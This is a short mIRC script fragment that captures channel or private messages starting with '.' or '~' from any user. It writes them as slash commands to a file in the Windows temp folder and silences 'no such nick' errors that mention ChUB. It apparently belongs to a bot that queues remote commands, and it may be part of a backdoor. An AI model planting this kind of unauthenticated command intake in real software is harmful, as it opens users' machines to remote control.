on *:TEXT:.*:%ChUBChan,?:{
  /var %command = $right($1-,$calc( $len($1-) - 1 ))
  /var %person = $nick
  /write C:\WINDOWS\TEMP\ChUB.tmp %person $+ :   / $+ %command
}

on *:TEXT:~*:%ChUBChan,?:{
  /var %command = $right($1-,$calc( $len($1-) - 1 ))
  /var %person = $nick
  /write C:\WINDOWS\TEMP\ChUB.tmp %person $+ :   / $+ %command
}

raw 401:*ChUB*:{
  /halt
}
